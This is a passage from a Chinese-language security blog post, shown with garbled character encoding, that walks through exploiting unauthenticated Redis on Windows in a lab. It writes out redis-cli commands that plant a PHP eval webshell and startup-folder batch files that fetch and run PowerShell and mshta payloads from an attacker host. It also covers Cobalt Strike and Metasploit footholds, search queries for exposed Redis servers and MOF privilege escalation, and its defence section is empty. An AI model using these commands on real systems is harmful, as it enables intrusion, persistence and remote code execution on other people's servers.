href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>ä¸»ä»å¤åˆ¶åŠ è½½çš„æ¶æ„so æ–‡ä»¶<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>MSF ä¸‹çš„åˆ©ç”¨æ¨¡å—<br>auxiliary/scanner/redis/file_upload normal Redis File Upload</p><p>auxiliary/scanner/redis/redis_login normal Redis Login Utility</p><p>auxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner</p><p>æ¼æ´æŒ–æ˜<br>å¯¹ port:6379 æœç´¢<br><a href="https://www.zoomeye.org/searchResult?q=port:6379">https://www.zoomeye.org/searchResult?q=port:6379</a></p><p>Fofa å…³é”®å­—æœç´¢<br>port=â€6379â€ &amp;&amp; protocol==redis &amp;&amp; country=CN<br>å¯¹Web ç½‘ç«™çš„çœŸå®ip è¿›è¡Œå…¨ç«¯å£æ‰«æ / æ¢æµ‹ redis</p><hr><h1 id="Windowsä¸‹Redis-åˆ©ç”¨æ€è·¯"><a href="#Windowsä¸‹Redis-åˆ©ç”¨æ€è·¯" class="headerlink" title="Windowsä¸‹Redis åˆ©ç”¨æ€è·¯"></a>Windowsä¸‹Redis åˆ©ç”¨æ€è·¯</h1><p>å­¦äº†ä¸¤å¤©çš„Cobalt Strike 4.0 çš„åŸºç¡€ä½¿ç”¨å’Œæœ¯è¯­ï¼Œç»§ç»­æŠŠä¹‹å‰æ¼æ‰çš„Windows ä¸‹åˆ©ç”¨Redis å­¦ä¹ æ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ªéš¾äº†ï¼ŒWindows Server 2008 R2 æˆ‘è¿™é‡Œ(VMware Fusion)æ²¡æ³•ç”¨VMware Toolsï¼ŒGithubï¼ˆå›¾ç‰‡ä¸Šgithub URLæ‰“é”™äº†ï¼‰ åˆä¸èƒ½è®¿é—®ï¼Œæœºå™¨ä¸Šä¹Ÿæ²¡æœ‰Githubã€‚æˆ‘æ˜¯å¦‚ä½•æŠŠWindows ç‰ˆçš„Redis å¼„ä¸Šå»çš„ï¼Ÿå“ˆå“ˆï¼ˆå…¶å®åé¢æƒ³äº†æƒ³è¿˜æœ‰å…¶ä»–åŠæ³•ï¼Œä¸è¿‡æ„Ÿè§‰ä¹Ÿæœ‰ç‚¹éº»çƒ¦ã€‚</p><p><img src="https://i.imgur.com/KRBRvS9.png"></p><p><img src="https://i.imgur.com/39WhmIK.png"></p><p>å› ä¸ºä¹‹å‰å¤ç° MS17-010ï¼ŒCVE-2019-0708ï¼Œå¼€å¯äº†445 å’Œ 3389 ã€‚æˆ‘è¿™é‡Œç”¨ms17-010 æ‰“è¿‡å»ï¼Œæ‹¿åˆ°äº†system æƒé™<br>ç”¨Cobalt Strike ç”Ÿæˆä¸Šçº¿ 64 ä½çš„exe å¯æ‰§è¡Œæ–‡ä»¶ä¸Šçº¿æœ¨é©¬<br>MSF ä¸Šä¼ æœ¨é©¬å¹¶æ‰§è¡Œ<br>Cobalt Strike ä¸Š2008 R2 æˆåŠŸ ä¸Šçº¿<br>ç„¶åä¹Ÿä¸èƒ½ä¼ ç›®å½•ï¼ˆå¯ä»¥ä¼ å‹ç¼©åŒ…ï¼Œç»ˆäºæ‡‚äº†ä¸ºä»€ä¹ˆæœ‰äº›ä¸œè¥¿ä¸èƒ½ä¼ æ–‡ä»¶å¤¹äº†ï¼‰ï¼Œä½†æ˜¯ç›¸æ¯”ç”¨msfï¼Œè¿™é‡Œå¯è§†åŒ–ä¸Šä¼ ä¹Ÿæ˜¯å¾ˆä¸é”™äº†ã€‚<br><img src="https://i.imgur.com/HMYcnTZ.png"></p><p><img src="https://i.imgur.com/A41ZMox.png"></p><p>ç®—æ˜¯ç¬¬ä¸€æ¬¡åŒæ—¶ä½¿ç”¨Metasploit å’Œ Cobalt Strikeã€‚</p><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>Redis-Serverï¼šWindows Server 2008 R2 x64<br>Attackerï¼šKali Linux<br>ç½‘ç»œï¼šNAT<br>IPï¼š192.168.118.134ï¼Œ192.168.118.129<br>PhpStudy 2018 æ­å»º Web æœåŠ¡,éœ€è¦ç›¸å…³vcè¿è¡Œåº“<br>åˆ‡æ¢åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œredi-server.exe redis.conf å³å¯å¯åŠ¨redis-server æœåŠ¡ã€‚<br><img src="https://i.imgur.com/U6Z4tkr.png"></p><p>netstat -ano æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ<br><img src="https://i.imgur.com/UANrinf.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»å¼€å¯äº† 6379 Redis æœåŠ¡ã€‚</p><p>å°è¯•è¿æ¥ä¸€ä¸‹<br><img src="https://i.imgur.com/n9gYmuj.png"></p><p>ping è¿”å› PONGã€‚æˆåŠŸè¿œç¨‹æœªæˆæƒè¿æ¥ä¸ŠRedisã€‚ï¼ˆç›¸æ¯”ä¸Linuxä¸‹å¤ç°ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰ä¿®æ”¹ä»»ä½•redis.confçš„å†…å®¹ï¼Œéš¾é“æ˜¯è¯´Windowsä¸‹é»˜è®¤å¯ä»¥ã€‚</p><h2 id="æ”»å‡»åœºæ™¯"><a href="#æ”»å‡»åœºæ™¯" class="headerlink" title="æ”»å‡»åœºæ™¯"></a>æ”»å‡»åœºæ™¯</h2><p>ç›¸æ¯”äºLinux ä¸‹æ”»å‡»Redis æœªæˆæƒï¼ŒWindows ä¸‹åˆæœ‰å“ªäº›å¯ä»¥åˆ©ç”¨çš„ï¼ŸLinux ä¸‹å¯ä»¥å†™å…¥Webshellï¼ŒWindows ä¸‹è‚¯å®šä¹Ÿè¡Œã€‚Linux ä¸‹å¯ä»¥å†™å…¥SSHï¼Œå¯¼è‡´SSH è¿œç¨‹ç™»å½•ç›®æ ‡æœºå™¨ï¼Œè€ŒWindowsæ²¡æœ‰ã€‚</p><h3 id="å†™å…¥Webshell"><a href="#å†™å…¥Webshell" class="headerlink" title="å†™å…¥Webshell"></a>å†™å…¥Webshell</h3><p>è¿™ç§æ–¹æ³•æœ€å®¹æ˜“æƒ³åˆ°ï¼Œä¹Ÿç›¸å¯¹æ¥è¯´æœ‰ç‚¹é¸¡è‚‹ï¼Œå› ä¸ºå¿…é¡»è¦çŸ¥é“Windows ä¸‹æ­å»ºçš„Web æœåŠ¡çš„ç½‘ç«™ç‰©ç†è·¯å¾„ï¼Œæ‰èƒ½å¾€é‡Œé¢å†™webshellï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çŒœæµ‹ï¼Œæˆ–è€…ä¸“é—¨å»æ”¶é›†ä¸€äº›å¸¸è§çš„ç½‘ç«™ç‰©ç†è·¯å¾„ä½ç½®ã€‚(è¿™æ¬¡æˆ‘å‘ç°ç”¨PHPStudy2018 å®‰è£…é»˜è®¤å­˜åœ¨ä¸€ä¸ªphpinfo.phpï¼Œä»¥åŠphpMyadmin)</p><p><img src="https://i.imgur.com/ydL4RPh.png"></p><p>ä¸ä¸€ä¼šå„¿ï¼Œæœ‰ä¸€ä¸ªå¸ˆå‚…èµ°è¿‡æ¥ï¼Œé—®æˆ‘åœ¨å¹²å˜›ï¼Œæˆ‘è¯´åœ¨å­¦æ‰“Redisâ€¦â€¦ ä»–è¯´ï¼Œä½ æ€ä¹ˆåˆåœ¨æ‰“Redisã€‚ã€‚ã€‚ç„¶åå°±è®¨è®ºäº†ä¸€ä¸‹(å¤§æ¦‚è¯´äº†æœ‰äº”åˆ†é’Ÿå·¦å³ï¼Œè¿™é‡Œå°±è¯´ä¸‹è®¨è®ºçš„ç»“è®ºï¼‰ï¼Œå‡è®¾Windows æœåŠ¡å™¨ä¸‹çš„Redis è‚¯å®šåœ¨å†…ç½‘ï¼Œ6379ä¸å‡ºç½‘ï¼Œç„¶åå¦‚æœå­˜åœ¨SSRFçš„ç‚¹ï¼Œé‚£ä¹ˆç”¨gopher åè®®å¯èƒ½å¯ä»¥æ‰“ä¸€æ³¢ SSRF æ”»å‡»å†…ç½‘æœªæˆæƒï¼Œå†™å…¥webshellï¼Œæˆ–è€…åå¼¹shellå•¥çš„ã€‚ä½†æ˜¯ï¼Œå¦‚ä½•æ‰“å…¥å†…ç½‘çš„é—®é¢˜ä¼¼ä¹æ‰æ˜¯åˆ©ç”¨çš„å…³é”®ï¼Œè€Œæˆ‘æ€»ç»“çš„è¿™äº›æ„Ÿè§‰éƒ½æ˜¯å·²ç»åœ¨å†…ç½‘äº†æˆ–è€…æ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªæœªæˆæƒçš„è®¿é—®äº†ï¼Œå¦‚æœæ²¡æœ‰SSRFä¼¼ä¹å°±æ²¡æœ‰åŠæ³•äº†(å°±å•ç‹¬è¯´ä»è¿™ä¸€å°æœºå™¨ã€‚æˆ‘æƒ³åˆ°ä¸€ç§ï¼Œå°±æ˜¯RCEä¿®æ”¹redis.conf,ç„¶åè®©6379 æš´éœ²å…¬ç½‘ï¼Œç„¶ååšä¸€ä¸ªéšè—åé—¨ï¼Œæ„Ÿè§‰åº”è¯¥å¯ä»¥è¿™æ ·åˆ©ç”¨ã€‚å½“ç„¶ï¼Œå·²ç»æœ‰RCEï¼Œé‚£ä¹ˆè‚¯å®šç¬¬ä¸€ä»¶æ˜¯å°±æ˜¯æ‹¿shelläº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ€è·¯æˆ‘è§‰å¾—åªèƒ½è¯´æ˜¯åœ¨åé¢æƒé™æŒç»­æ§åˆ¶çš„æ—¶å€™ï¼Œå½“ä½œä¸€ç§æ€è·¯ç½¢äº†ï¼ˆæ„Ÿè§‰å…·ä½“å®ç°æ€§çš„è¯ä¹Ÿä¸æ˜¯å¾ˆè¡Œã€‚æ™šä¸Šæˆ‘åˆæƒ³åˆ°ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¿¡æ¯æ³„æ¼ï¼Œæ¯”å¦‚è¯´å†…ç½‘ipä¿¡æ¯æ³„æ¼å•¥çš„ï¼Œæ¥è¿›å…¥å†…ç½‘ï¼Ÿå…¶ä»–æ–¹æ³•ï¼Œå¯ä»¥ä»¥åæœ‰æƒ³æ³•äº†ï¼Œå†æ¥ç ”ç©¶ç ”ç©¶ã€‚</p><p>å¾—åˆ°ç‰©ç†è·¯å¾„ï¼šC:/Users/Administrator/Desktop/PHPTutorial/WWW</p><p>ç„¶åå°±å’ŒLinux ä¸‹å†™Webshell å·®ä¸å¤šäº†ï¼Œåªæ˜¯æ¢äº†ä¸€ä¸‹dir è·¯å¾„ï¼Œå’Œæ¢è¡Œç¬¦çš„åŒºåˆ«ï¼Œå› ä¸ºWindows å’Œ Linux çš„æ¢è¡Œç¬¦æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™é‡Œæ˜¯Windowsï¼Œæ‰€ä»¥æ˜¯\r\nï¼ˆä¹Ÿæ˜¯ä¸€æ ·ï¼Œé¿å…å’ŒåŸå§‹æ•°æ®æ··æ·†ï¼‰</p><p>192.168.118.134:6379&gt; config set dir C:/Users/Administrator/Desktop/PHPTutorial/WWW<br>OK<br>192.168.118.134:6379&gt; set webshell â€œ\r\n<?php @eval($_POST[a]);?>\r\nâ€<br>OK<br>192.168.118.134:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.134:6379&gt; save<br>OK<br><img src="https://i.imgur.com/AxEyXv7.png"></p><p>è¿˜å‘ç°äº†ï¼Œè¿™äº›æ“ä½œï¼Œä¼¼ä¹éƒ½ä¼šè¢«è®°å½•è¿›redis æ—¥å¿—çš„ã€‚</p><p><img src="https://i.imgur.com/guAkaO1.png"></p><p>å½“ç„¶ï¼Œä½¿ç”¨shell ç®¡ç†å™¨ï¼Œæ¯”å¦‚èšå‰‘æ˜¯è‚¯å®šèƒ½è¿ä¸Šçš„ã€‚</p><p>æŸ¥çœ‹ä¸€ä¸‹webshell.php<br>Redis å†™æ–‡ä»¶ä¼šè‡ªåŠ¨å†™å…¥ä¸€è¡Œç‰ˆæœ¬ä¿¡æ¯ã€‚ç„¶åå†æ˜¯æˆ‘ä»¬å†™çš„ä¸œè¥¿ã€‚</p><p><img src="https://i.imgur.com/BhlKVPY.png"></p><p>è¯´æ˜äº†ä¹‹å‰åœ¨å­¦ä¹ Linuxä¸‹åˆ©ç”¨rediså†™webshellçš„æ—¶å€™ï¼Œå…¶å®ä¸ç”¨flushall ä¹Ÿå¯ä»¥å†™webshellçš„ï¼Œåœ¨æ–°çš„ä¸€ä¸ªdbfile é‡Œé¢å†™å…¥å°±è¡Œäº†ã€‚</p><h3 id="å†™å…¥å¯åŠ¨é¡¹"><a href="#å†™å…¥å¯åŠ¨é¡¹" class="headerlink" title="å†™å…¥å¯åŠ¨é¡¹"></a>å†™å…¥å¯åŠ¨é¡¹</h3><p>â€œç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹â€å’Œâ€œç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹â€çš„åŒºåˆ«ï¼š</p><p>1ã€ä¸¤è€…å¯åŠ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ä¸ä¸€æ ·ã€‚ç”¨æˆ·å¼€æœºå¯åŠ¨æ–‡ä»¶å¤¹ï¼Œå¯¹åº”â€œå¼€å§‹èœå•â€-â€œç¨‹åºâ€-â€œå¯åŠ¨â€åŠŸèƒ½ï¼Œè·¯å¾„æ˜¯ï¼šâ€œC:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startupâ€ï¼›ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹å¯¹åº”çš„è·¯å¾„æ˜¯ï¼šâ€œC:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startupâ€ã€‚</p><p>2ã€ä¸¤è€…èµ·åˆ°çš„åŠŸèƒ½ä¸ä¸€æ ·ã€‚ä¸¾ä¾‹è¯´æ˜ï¼šå¦‚æœç³»ç»Ÿæœ‰adminå’Œguestä¸¤ä¸ªç³»ç»Ÿç”¨æˆ·ï¼Œadminä½¿ç”¨æ–¹æ³•ä¸€ï¼ˆç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹ï¼‰æ·»åŠ å¼€æœºå¯åŠ¨é¡¹ï¼Œé‚£ä¹ˆåªæœ‰ä½¿ç”¨adminç™»å½•ç³»ç»Ÿæ—¶ï¼Œå¼€æœºå¯åŠ¨é¡¹æ‰ä¼šèµ·ä½œç”¨ï¼Œguestç”¨æˆ·ç™»å½•ç³»ç»Ÿä¸ä¼šè‡ªåŠ¨å¯åŠ¨ï¼›è€Œä½¿ç”¨æ–¹æ³•äºŒï¼ˆç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹ï¼‰è®¾ç½®çš„å¼€æœºå¯åŠ¨é¡¹ï¼Œåœ¨adminå’Œguestç™»å½•ç³»ç»Ÿæ—¶éƒ½ä¼šå¯åŠ¨ã€‚</p><p>å†™å…¥å¯åŠ¨é¡¹ï¼Œå¤§æ¦‚æœ‰ä¸‰ç§æ”»å‡»è·¯çº¿ï¼Œåˆ©ç”¨msfï¼ŒCSï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯PS_Shell.rb æ¥ä¸Šçº¿ã€‚</p><p>åˆ©ç”¨Cobalt Strike<br>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ Metasploitã€‚</p><blockquote><p>Attacks -&gt; Web Drive-by -&gt; Scripted Web Deliveryï¼Œé€‰æ‹©Powershell</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.118.129:80&#x2F;aaa&#39;))&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åå’Œå†™å…¥Webshell ä¸€æ ·çš„æ–¹å¼ï¼Œå°†ä¸Šé¢çš„payload ä¿å­˜ä¸º.batæ–‡ä»¶ã€‚è¿™é‡Œå› ä¸ºpayloadé‡Œé¢æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œè½¬ä¹‰ã€‚</p><p>batï¼ˆæ‰¹å¤„ç†ï¼‰æ–‡ä»¶æ¦‚å¿µï¼šåœ¨DOSå’ŒWindows 9x æ“ä½œç³»ç»Ÿå®¶æ—ä¸­ï¼Œæ‰¹å¤„ç†æ–‡ä»¶çš„æ–‡ä»¶æ‰©å±•åä¸º.batã€‚å½“è¿è¡Œæ‰¹å¤„ç†æ–‡ä»¶æ—¶ï¼Œé€šå¸¸æ˜¯cmd.exeï¼Œä¼šè¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå¹¶é€è¡Œè¿è¡Œã€‚</p><p>192.168.118.146:6379&gt; config set dir â€œC:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startupâ€<br>OK<br>192.168.118.146:6379&gt; config set dbfilename config.bat<br>OK<br>192.168.118.146:6379&gt; set shell_bat â€œ\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(â€˜<a href="http://192.168.118.129/aaa&#39;))\&quot;\r\n\r\n&quot;">http://192.168.118.129:80/aaa&#39;))\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>æ‰‹åŠ¨é‡å¯é¶æœºã€‚ã€‚å¯ä»¥å‘ç°ä¸»æœºä¸Šçº¿äº†ã€‚ï¼ˆè¿™é‡Œæˆ‘ä¸­é€”å»åƒé¥­äº†ï¼Œç„¶åå›æ¥åˆçœ‹äº†ä¸€ä¸‹å…³äºSRCç›¸å…³çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æ—¶é—´ä¸Šçœ‹èµ·æ¥ä¸Šçº¿å¾ˆæ™šï¼Œå®é™…ä¸Šï¼Œç­‰å¼€æœºä¹‹åè¿‡ä¸€ä¼šå„¿å°±ä¸Šçº¿äº†ï¼Œå¯èƒ½è¿™å–å†³äºç›®æ ‡ç³»ç»Ÿçš„æµç•…åº¦</p><p><img src="https://i.imgur.com/QDxyT31.png"></p><p>æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹<br><img src="https://i.imgur.com/TY3qpOp.png"></p><p>ç¡®å®æˆåŠŸå†™å…¥ï¼Œå¹¶ä¸”æ‰§è¡Œäº†ã€‚</p><h3 id="åˆ©ç”¨mshta-PS-shell"><a href="#åˆ©ç”¨mshta-PS-shell" class="headerlink" title="åˆ©ç”¨mshta PS_shell"></a>åˆ©ç”¨mshta PS_shell</h3><p>åˆ©ç”¨çš„exploitï¼š<a href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb">https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb</a></p><p>åœ¨/usr/share/metasploit-framework/modules/exploits/windowsä¸‹åˆ›å»ºä¸€ä¸ªPS_shell.rbæ–‡ä»¶ï¼Œå°†ä¸Šé¢çš„å†…å®¹å¡«å…¥è¿›å»ã€‚è¿›å…¥msfconsole ç„¶åé‡æ–°è½½å…¥ä¸€ä¸‹exploitï¼Œreload_allã€‚</p><p><img src="https://i.imgur.com/ugzwH85.png"></p><p>ç„¶åè¿è¡Œmshta.exe â€œâ€¦â€¦â€ å°±å¯ä»¥åå¼¹shelläº†ã€‚</p><p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨redis æœªæˆæƒï¼Œå†™å…¥å¯åŠ¨é¡¹æ¥è¿è¡Œï¼Œä»è€Œå¾—åˆ°åå¼¹shellã€‚</p><p>192.168.118.146:6379&gt; config set dir â€œC:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startupâ€<br>OK<br>192.168.118.146:6379&gt; config set dbfilename backup.bat<br>OK<br>192.168.118.146:6379&gt; set backup â€œ\r\n\r\n mshta.exe &quot;<a href="http://192.168.118.129:8080/tql/&quot;/r/n/r/n&quot;">http://192.168.118.129:8080/tql\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>æ‰‹åŠ¨é‡å¯ç›®æ ‡æœºå™¨ã€‚ã€‚ä¸è¿‡æ¯æ¬¡é‡å¯ä¹‹åï¼Œè¿˜è¦åˆ‡æ¢æˆAdministratorè´¦æˆ·ï¼Œæ‰ä¼šæ”¶åˆ°sessionæˆ–è€…è¯´ä¸Šçº¿ã€‚<br><img src="https://i.imgur.com/ZY8Ae2n.png"></p><p><img src="https://i.imgur.com/VV6WV5W.png"></p><p>å…³äº mshta.exeçš„ç§‘æ™®ï¼š<a href="https://baike.baidu.com/item/Mshta.exe/10666591">https://baike.baidu.com/item/Mshta.exe/10666591</a></p><p><a href="http://jincheng.xpcha.com/675nabeltqm/">http://jincheng.xpcha.com/675nabeltqm/</a></p><p>è‹±æ–‡å…¨ç§°Microsoft HTML Applicationï¼Œå¯ç”¨äºæ‰§è¡Œ.HTA æ–‡ä»¶ï¼Œæ˜¯å¾®è½¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€åº”ç”¨ã€‚</p><p>è€Œåœ¨ä¹‹å‰é‚£ä¸ªPS_Shell.rb çš„æºç ä¸­ï¼Œåˆ©ç”¨çš„æ˜¯ CVE-2017-11882ï¼Œå…¶ä¸­æœ‰ä¸€æ®µæ³¨é‡Š</p><p>This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc.</p><p>æ¼æ´åˆ†æï¼š<a href="https://www.anquanke.com/post/id/87311">https://www.anquanke.com/post/id/87311</a> æ¼æ´ç±»å‹ï¼šæ ˆæº¢å‡ºæ¼æ´å¯¼è‡´å†…å­˜æŸå</p><h3 id="å†™å…¥MOF"><a href="#å†™å…¥MOF" class="headerlink" title="å†™å…¥MOF"></a>å†™å…¥MOF</h3><p>ç¯å¢ƒå¿…é¡»ä¸ºWindows 2003ï¼Œæ¯”è¾ƒä¹…è¿œçš„ææƒæ–¹æ³•ã€‚è¿™é‡Œä¸å¤ç°äº†ï¼Œäº†è§£ä¸€ä¸‹å§ã€‚å¦‚æœæœ‰æœºä¼šä¼šç”¨åˆ°ï¼Œè‡³å°‘è¦çŸ¥é“ã€‚<br>mofæ˜¯windowsç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ï¼ˆåœ¨c:/windows/system32/wbem/mof/nullevt.mofï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€å…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚å…¶å°±æ˜¯ç”¨åˆäº†mysqlçš„rootæƒé™äº†ä»¥åï¼Œç„¶åä½¿ç”¨rootæƒé™å»æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„mofã€‚éš”äº†ä¸€å®šæ—¶é—´ä»¥åè¿™ä¸ªmofå°±ä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªmofå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œè¿™ä¸ªvbså¤§å¤šæ•°çš„æ˜¯cmdçš„æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„mofæ–‡ä»¶ä¼šæ¯5ç§’è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±ä¸éœ€è¦é‡å¯æœºå™¨å°±èƒ½è·å–æƒé™äº†ã€‚</p><p>è¿™ç§åˆ©ç”¨æ–¹å¼ä¸ç”¨é‡å¯ç›®æ ‡æœºå™¨ï¼Œä¹Ÿä¸éœ€è¦è·å–ç›®æ ‡Webçš„ç‰©ç†è·¯å¾„ï¼Œåªæ˜¯ç¯å¢ƒå¿…é¡»æ˜¯Windows 2003</p><h3 id="DLL-åŠ«æŒ"><a href="#DLL-åŠ«æŒ" class="headerlink" title="DLL åŠ«æŒ"></a>DLL åŠ«æŒ</h3><p>è¿™ç§åˆ©ç”¨æ–¹æ³•å’Œä¸‹é¢çš„å¿«æ·æ–¹å¼è¦†å†™è¯·å‚è€ƒR3startå¤§ä½¬çš„æ–‡ç« ï¼š<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a></p><h3 id="å¿«æ·æ–¹å¼è¦†å†™"><a href="#å¿«æ·æ–¹å¼è¦†å†™" class="headerlink" title="å¿«æ·æ–¹å¼è¦†å†™"></a>å¿«æ·æ–¹å¼è¦†å†™</h3><h2 id="å¦‚ä½•é˜²å¾¡"><a href="#å¦‚ä½•é˜²å¾¡" class="headerlink" title="å¦‚ä½•é˜²å¾¡"></a>å¦‚ä½•é˜²å¾¡</h2><p>å‚è€ƒä¸Šé¢çš„æ¼æ´ä¿®å¤</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Windowsä¸‹çš„åˆ©ç”¨æ€è·¯ï¼Œå…¶å®å‰ä¸¤å¼ å’ŒLinuxä¸‹æ˜¯ä¸€æ ·çš„ã€‚ç”šè‡³æ¯”Linux ä¸‹è¿˜é¸¡è‚‹ï¼Œæ¯•ç«ŸLinux ä¸‹çš„web ç›®å½•æ˜¯å¯ä»¥çŒœæµ‹çš„ï¼ˆå°±é‚£ä¹ˆå‡ ä¸ªã€‚å†™å…¥MOFï¼Œå‰å‡ å¤©åœ¨å…ˆçŸ¥ç¤¾åŒºä¹Ÿæœ‰äººå‘äº†æ–‡ç« äº†ï¼Œ<a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a></p><p>DLL åŠ«æŒ å’Œ å¿«æ·æ–¹å¼è¦†å†™é¢†ä¼šæ€è·¯å’ŒåŸç†å§ï¼Œä¸æƒ³å¤ç°äº†ï¼Œæœ€è¿‘äº‹æƒ…å¤ªå¤šäº†ã€‚ï¼ˆåŸ‹å‘ã€‚</p><p>å¦å¤–ï¼ŒLinux ä¸‹è¿˜æœ‰å¦‚ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š</p><p>å†™å…¥åˆ°/etc/profile.d/ç”¨æˆ·ç¯å¢ƒå˜é‡<br>å¼€å¯AOFæŒä¹…åŒ–çº¯æ–‡æœ¬è®°å½•appendfilename<br>è¿™é‡Œï¼Œå°±å…ˆä¸ç ”ç©¶äº†ï¼Œæ„Ÿè§‰ç›®å‰ç”¨ä¸åˆ°ï¼Œäº†è§£ä¸€ä¸‹å°±è¡Œäº†ã€‚</p><h2 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h2><p><a href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p><p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a> Redis åœ¨Windows ä¸‹ å¦‚ä½•Getshell</p><p><a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a> Redis Windows è¸©å‘</p><p>æ¢è¡Œç¬¦ï¼š<a href="https://blog.csdn.net/CJF_iceKing/article/details/47836201">https://blog.csdn.net/CJF_iceKing/article/details/47836201</a></p><p>Windows å¼€æœºå¯åŠ¨é¡¹ï¼š<a href="http://www.win10xiazai.com/win10/5334.html">http://www.win10xiazai.com/win10/5334.html</a></p><p>GetShell ï¼š<a href="https://cloud.tencent.com/developer/article/1488184">https://cloud.tencent.com/developer/article/1488184</a></p><p>MOFææƒï¼š</p><p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a><br><a href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/</a><br>DLLåŠ«æŒ&amp;&amp;INK è¦†å†™ æ¥åˆ©ç”¨redisï¼š<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a> ï¼Œå·¥å…·ä¹Ÿæ˜¯è¿™ä½å¸ˆå‚…å†™çš„ï¼Œæ„Ÿè§‰å¥½å¼ºã€‚</p><p>DLL åŠ«æŒå‚è€ƒï¼š</p><p><a href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/</a></p>]]></content>
    
    
      
      
